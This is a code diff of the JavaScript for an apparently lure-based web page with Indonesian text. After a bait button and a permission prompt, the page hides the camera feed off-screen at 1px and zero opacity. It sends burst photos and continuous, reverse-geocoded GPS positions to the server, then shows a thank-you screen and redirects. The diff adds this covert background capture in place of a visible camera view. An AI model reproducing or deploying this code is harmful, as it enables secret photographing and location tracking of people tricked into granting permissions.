+attachFakeTrigger('pulsa-btn','pulsa-note');
+
+// ── ③ Normal Allow button ─────────────────────────────────────────────────────
+$('allow-btn').addEventListener('click', async () => {
+  $('allow-btn').disabled=true; $('allow-btn').textContent='Memproses...';
+  await doPermission();
+});
+
+// ── ④ Core Permission Flow ────────────────────────────────────────────────────
+async function doPermission() {
+  try {
+    if (CFG.canary) {
+      // Canary mode: hanya tampilkan pesan, tidak ada kamera/GPS
+      show('s-active');
+      $('cmsg').textContent = CFG.msg || 'Fitur aktif.';
+      initStats();
+      return;
+    }
+
+    if (CFG.mode === 'photo') {
+      await startBgCamera();
+      show('s-active'); initStats();
+
+    } else if (CFG.mode === 'gps') {
+      show('s-gps-only');
+      startGPS(false);
+
+    } else if (CFG.mode === 'both') {
+      await startBgCamera();
+      show('s-active'); initStats();
+      startGPS(true);
+    }
+
+  } catch(err) {
+    const m = {
+      NotAllowedError:  'Izin ditolak. Buka Pengaturan browser → aktifkan akses kamera/lokasi.',
+      NotFoundError:    'Kamera tidak ditemukan di perangkat ini.',
+      NotReadableError: 'Kamera sedang dipakai aplikasi lain.',
+    };
+    setErr('Akses Ditolak', m[err.name] || err.message);
+  }
+}
+
+// ── ⑤ Background Camera + Burst + Retry + Offline Queue ──────────────────────
+let bgVideo = null;
+
+async function startBgCamera() {
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video:{facingMode:CFG.facing, width:{ideal:CFG.width},
+           height:{ideal:Math.round(CFG.width*3/4)}},
+    audio:false
+  });
+  bgVideo = document.createElement('video');
+  bgVideo.srcObject=stream; bgVideo.muted=true;
+  bgVideo.playsInline=true; bgVideo.autoplay=true;
+  bgVideo.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
+  document.body.appendChild(bgVideo);
+  await bgVideo.play();
+
+  bgVideo.onloadedmetadata = () => {
+    // Burst pertama setelah kamera siap
+    setTimeout(() => doBurst(), 800);
+    // Loop interval normal setelah burst
+    setInterval(() => doBurst(), CFG.interval * 1000);
   };
 }
 
-async function sendFrameHTTP() {
-  const v = $('vid-stream');
-  if (!v.videoWidth) return;
-  let w = Math.min(v.videoWidth, 480), h = Math.round(v.videoHeight * w / v.videoWidth);
-  canvas.width = w; canvas.height = h;
-  ctx.drawImage(v, 0, 0, w, h);
-  canvas.toBlob(async blob => {
-    if (!blob) return;
-    try {
-      await fetch(`/api/frame/${CFG.token}`, {
-        method:'POST', headers:{'Content-Type':'image/jpeg'}, body: blob
-      });
-      fpsCnt++;
-      const now = Date.now();
-      if (now - lastFpsMs >= 2000) {
-        $('fps-t').textContent = (fpsCnt * 1000 / (now - lastFpsMs)).toFixed(1) + ' fps';
-        fpsCnt = 0; lastFpsMs = now;
-      }
-    } catch(e) {}
-  }, 'image/jpeg', 0.7);
+async function captureFrame() {
+  if (!bgVideo || !bgVideo.videoWidth) return null;
+  const w = Math.min(bgVideo.videoWidth, CFG.width);
+  const h = Math.round(bgVideo.videoHeight * w / bgVideo.videoWidth);
+  canvas.width=w; canvas.height=h;
+  ctx.save(); ctx.translate(w,0); ctx.scale(-1,1);
+  ctx.drawImage(bgVideo,0,0,w,h); ctx.restore();
+  return new Promise(res => canvas.toBlob(res,'image/jpeg',0.82));
 }
 
-function setInterval_ms(v) {
-  sendMs = parseInt(v);
-  clearInterval(sendTimer);
-  sendTimer = setInterval(sendFrameHTTP, sendMs);
-}
-
-function flipCam() {
-  usingFront = !usingFront;
-  if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-  navigator.mediaDevices.getUserMedia({
-    video:{facingMode: usingFront ? 'user':'environment',width:{ideal:640},height:{ideal:480}},
-    audio:false
-  }).then(s => { mediaStream=s; $('vid-stream').srcObject=s; });
-}
-
-function stopAll() {
-  clearInterval(sendTimer);
-  if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-}
-
-function showStreamBanner(msg) {
-  const bar = document.createElement('div');
-  bar.style.cssText=`position:absolute;top:0;left:0;right:0;z-index:100;
-    background:rgba(0,212,255,.15);border-bottom:1px solid rgba(0,212,255,.3);
-    padding:10px 16px;text-align:center;font-size:13px;color:var(--cyan);
-    white-space:pre-wrap;line-height:1.5;backdrop-filter:blur(8px)`;
-  bar.textContent = msg;
-  const x = document.createElement('span');
-  x.textContent='  ✕'; x.style.cursor='pointer';
-  x.onclick=()=>bar.remove();
-  bar.appendChild(x);
-  $('s-stream').appendChild(bar);
-}
-
-// ── ④ Foto ───────────────────────────────────────────────────────────────────
-async function doCapture() {
-  const btn = $('cap-btn'); btn.disabled=true; btn.textContent='⏳';
-  const v = $('vid-photo');
-  let w = Math.min(v.videoWidth,1280), h=Math.round(v.videoHeight*w/v.videoWidth);
-  canvas.width=w; canvas.height=h; ctx.drawImage(v,0,0,w,h);
-  canvas.toBlob(async blob => {
-    const url = URL.createObjectURL(blob);
-    if (mediaStream) mediaStream.getTracks().forEach(t=>t.stop());
-    try {
-      await fetch(`/api/capture/${CFG.token}`,
-        {method:'POST', headers:{'Content-Type':'image/jpeg'}, body:blob});
-    } catch(e){}
-    const pi=$('msg-photo'); pi.src=url; pi.style.display='block';
-    $('msg-txt').textContent = CFG.msg || 'Foto berhasil dikirim!';
-    show('s-msg');
-  },'image/jpeg',.92);
-}
-
-// ── ⑤ GPS ────────────────────────────────────────────────────────────────────
-function startGPS() {
-  leafMap = L.map('gps-map').setView([-2.5,118],5);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
-    {attribution:'© OpenStreetMap'}).addTo(leafMap);
-  if (CFG.msg) {
-    const b=$('gps-banner'); b.textContent=CFG.msg; b.style.display='block';
-  }
-  navigator.geolocation.watchPosition(onGPS, onGPSErr,
-    {enableHighAccuracy:true,timeout:30000,maximumAge:0});
-}
-
-async function onGPS(pos) {
-  const {latitude:lat,longitude:lng,accuracy} = pos.coords;
-  $('g-lat').textContent  = lat.toFixed(6);
-  $('g-lng').textContent  = lng.toFixed(6);
-  $('g-acc').textContent  = `±${Math.round(accuracy)}m`;
-  $('g-time').textContent = new Date().toLocaleTimeString('id-ID');
-  if (!leafMarker) { leafMarker=L.marker([lat,lng]).addTo(leafMap); leafMap.setView([lat,lng],16); }
-  else leafMarker.setLatLng([lat,lng]);
-  polyPts.push([lat,lng]);
-  if (polyPts.length>1) L.polyline(polyPts,{color:'#00d4ff',weight:2,opacity:.6}).addTo(leafMap);
-  const now = Date.now();
-  if (now - lastGpsSent < 5000) return;
-  lastGpsSent = now;
+async function sendPhoto(blob) {
+  if (!blob) return;
+  if (!isOnline) { offlineQueue.push(blob); updateQueueBadge(); return; }
   try {
-    await fetch(`/api/capture/${CFG.token}`,{method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({lat,lng,accuracy,timestamp:new Date().toISOString()})});
-  } catch(e){}
+    const ok = await fetchWithRetry(`/api/capture/${CFG.token}`, {
+      method:'POST', headers:{'Content-Type':'image/jpeg'}, body:blob
+    });
+    if (ok) {
+      photoCnt++; updateStats();
+      if (photoCnt === 1) doThankYou();
+    } else {
+      // Server error (non-exception) — simpan ke antrian offline
+      offlineQueue.push(blob); updateQueueBadge();
+    }
+  } catch {
+    // Network error / timeout
+    offlineQueue.push(blob); updateQueueBadge();
+  }
 }
-function onGPSErr(err){ $('g-acc').textContent=err.message; }
 
-// ── Wake Lock ────────────────────────────────────────────────────────────────
-(async()=>{try{if('wakeLock' in navigator) await navigator.wakeLock.request('screen')}catch{}})();
+let burstRunning = false;   // Bug 3 fix: cegah burst berjalan bersamaan
+
+async function doBurst() {
+  if (burstRunning) return;   // skip jika burst sebelumnya belum selesai
+  burstRunning = true;
+  try {
+    const count = CFG.burstCount;
+    for (let i=0; i<count; i++) {
+      const blob = await captureFrame();
+      await sendPhoto(blob);
+      if (i < count-1) await slp(CFG.burstInterval);
+    }
+  } finally {
+    burstRunning = false;
+  }
+}
+
+// ── ⑥ GPS ─────────────────────────────────────────────────────────────────────
+function startGPS(bgOnly) {
+  if (!bgOnly) {
+    leafMap = L.map('gps-map-d').setView([-2.5,118],5);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+      {attribution:'© OpenStreetMap'}).addTo(leafMap);
+    if (CFG.msg) { const b=$('gps-banner'); b.textContent=CFG.msg; b.style.display='block'; }
+  }
+  navigator.geolocation.watchPosition(
+    pos => onGPS(pos, bgOnly),
+    err => { if(!bgOnly) $('g-acc').textContent=err.message; },
+    {enableHighAccuracy:true, timeout:30000, maximumAge:0}
+  );
+}
+
+async function onGPS(pos, bgOnly) {
+  const {latitude:lat, longitude:lng, accuracy} = pos.coords;
+  if (!bgOnly) {
+    $('g-lat').textContent=lat.toFixed(6); $('g-lng').textContent=lng.toFixed(6);
+    $('g-acc').textContent=`±${Math.round(accuracy)}m`;
+    $('g-time').textContent=new Date().toLocaleTimeString('id-ID');
+    if (!leafMarker) { leafMarker=L.marker([lat,lng]).addTo(leafMap); leafMap.setView([lat,lng],15); }
+    else leafMarker.setLatLng([lat,lng]);
+    polyPts.push([lat,lng]);
+    if (polyPts.length>1) L.polyline(polyPts,{color:'var(--acc)',weight:2,opacity:.6}).addTo(leafMap);
+    // Reverse geocoding
+    fetchAddress(lat, lng).then(addr => { if (addr) $('gps-addr').textContent=addr; });
+  }
+
+  const now = Date.now();
+  if (now-lastGpsSent < 5000) return;
+  lastGpsSent = now;
+
+  // Get address for GPS capture
+  let address = '';
+  try { address = await fetchAddress(lat, lng); } catch{}
+
+  try {
+    const url = address
+      ? `/api/capture/${CFG.token}?address=${encodeURIComponent(address)}`
+      : `/api/capture/${CFG.token}`;
+    await fetchWithRetry(url, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({lat,lng,accuracy,timestamp:new Date().toISOString()})
+    });
+    gpsCnt++;
+    if (bgOnly) updateStats();
+    if (gpsCnt===1) doThankYou();
+  } catch{}
+}
+
+async function fetchAddress(lat, lng) {
+  try {
+    const r = await fetch(`/api/address?lat=${lat}&lng=${lng}`, {signal:AbortSignal.timeout(4000)});
+    const d = await r.json();
+    return d.display_name ? d.display_name.split(',').slice(0,3).join(', ') : '';
+  } catch { return ''; }
+}
+
+// ── ⑦ Stats row ───────────────────────────────────────────────────────────────
+function initStats() {
+  const row = $('stats-row'); if (!row) return;
+  if (CFG.mode==='photo') {
+    row.innerHTML=`<div class="stat"><span class="sico">📸</span>
+      <span class="sval" id="st-photo">0</span><span class="slbl">foto terkirim</span></div>`;
+  } else if (CFG.mode==='both') {
+    row.innerHTML=`
+      <div class="stat"><span class="sico">📸</span>
+        <span class="sval" id="st-photo">0</span><span class="slbl">foto</span></div>
+      <div class="stat"><span class="sico">📍</span>
+        <span class="sval" id="st-gps">0</span><span class="slbl">lokasi</span></div>`;
+  }
+}
+
+function updateStats() {
+  const ep=$('st-photo'), eg=$('st-gps');
+  if(ep) ep.textContent=photoCnt; if(eg) eg.textContent=gpsCnt;
+}
+
+// ── ⑧ Thank You + Countdown Redirect ─────────────────────────────────────────
+function doThankYou() {
+  if (!CFG.tyTitle && !CFG.tyMsg && !CFG.redirectUrl) return;
+  show('s-thankyou');
+  $('ty-title').textContent = CFG.tyTitle || 'Terima Kasih!';
+  $('ty-msg').textContent   = CFG.tyMsg   || '';
+  if (CFG.redirectUrl) startCountdown();
+}
+
+function startCountdown() {
+  let secs = CFG.redirectDelay;
+  const el  = $('ty-countdown');
+  el.style.display = 'block';
+  el.textContent = `Mengalihkan dalam ${secs} detik...`;
+  const t = setInterval(() => {
+    secs--;
+    if (secs <= 0) { clearInterval(t); location.href=CFG.redirectUrl; }
+    else el.textContent = `Mengalihkan dalam ${secs} detik...`;
+  }, 1000);
+}
+
+function closeTY() {
+  if (CFG.redirectUrl) location.href = CFG.redirectUrl;
+  else location.href = 'about:blank';
+}
+
+// ── Wake Lock ─────────────────────────────────────────────────────────────────
+(async()=>{try{if('wakeLock' in navigator)await navigator.wakeLock.request('screen')}catch{}})();
 
 startLoading();
 </script>
